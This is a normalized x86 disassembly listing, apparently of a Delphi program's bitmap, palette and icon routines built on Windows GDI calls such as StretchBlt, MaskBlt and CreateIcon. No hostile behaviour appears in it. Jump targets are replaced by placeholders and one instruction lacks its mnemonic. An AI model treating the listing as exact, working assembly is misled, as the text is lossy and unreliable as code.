call sub_41c958
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41d5dc
call sub_41c958
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41e028
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41e072
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e079
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_41e07c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_41e118
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41e028
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404218
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e11f
lea eax [ ebp - 0x104 ]
call sub_403fa8
retn
sub_41e134
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41e282
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41e1f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41e07c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41e07c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e289
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41e294
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41e2c8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41e124
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41e548
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41e124
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e54f
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41e124
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41e39b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_4069f0
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e54f
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41e55c
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41e594
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402c64
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41e60c
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41e664
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028b8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e761
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e768
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41e77c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41e802
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41e814
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028b8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41e60c
mov eax esp
call sub_41e77c
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41e8b8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41e60c
mov [ esp ] eax
sub_41e90c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41e2b4
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41e294
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_41eab8
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41e124
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e9de
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41e134
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e9e5
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41e028
sub_41e9e5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41e2b4
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41e124
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41ea98
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_41e134
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea9f
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41ead4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41eb64
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407b7c
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_41ee5b
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_41ec4d
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41e028
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec54
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41ec54
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41eac8
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407b7c
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_41ee3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41e90c
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407b7c
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_41ee18
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee1f
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026dc
retn
call sub_41e07c
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41eac8
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41ead4
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41ee84
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41e004
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c64
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41e2b4
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41ef68
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41ee84
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_41efd4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41ee84
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f071
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f078
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
